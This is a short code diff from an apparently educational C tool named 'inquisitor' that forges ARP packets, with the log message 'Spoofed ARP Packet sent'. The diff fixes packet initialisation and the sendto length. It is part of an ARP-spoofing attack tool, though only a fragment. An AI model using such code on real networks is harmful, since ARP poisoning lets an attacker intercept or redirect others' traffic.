@@ -1,6 +1,7 @@
 #include "../inc/inquisitor.h"
 
 void base_init_packet(t_packet *packet) {
+  memset(packet, 0, sizeof(*packet));
   packet->ar_hrd = htons(HW_TYPE_ETHERNET);
   packet->ar_pro = htons(ETH_P_IP);
   packet->ar_hln = LEN_HW_ETHERNET;
@@ -60,7 +61,7 @@ void send_fake_arp_packet(t_inquisitor *inquisitor, uint32_t dest) {
   }
   init_ether_frame(&frame, &packet);
   init_dest_sock(&dest_addr, inquisitor);
-  byte_sent = sendto(inquisitor->sock, &frame, sizeof(frame) + sizeof(packet), 0, (struct sockaddr *) &dest_addr,sizeof(dest_addr));
+  byte_sent = sendto(inquisitor->sock, &frame, sizeof(frame), 0, (struct sockaddr *) &dest_addr,sizeof(dest_addr));
   if (byte_sent == -1)
     error("sendto", NULL, __FILE__, __LINE__, __func__);
   dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, dest == 1 ? inquisitor->mac_target : inquisitor->mac_src);
